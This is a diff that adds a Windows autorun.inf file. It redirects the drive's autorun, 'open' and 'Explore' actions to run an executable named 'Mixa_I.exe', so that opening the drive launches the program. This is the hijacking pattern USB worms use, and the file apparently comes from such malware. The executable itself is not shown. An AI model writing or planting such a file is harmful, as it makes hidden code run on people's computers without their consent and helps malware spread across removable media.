@@ -1,0 +1,5 @@
+[autorun]
+shellexecute = Mixa_I.exe
+shell\open\command = Mixa_I.exe
+shell\Explore\command = Mixa_I.exe
+shell = open
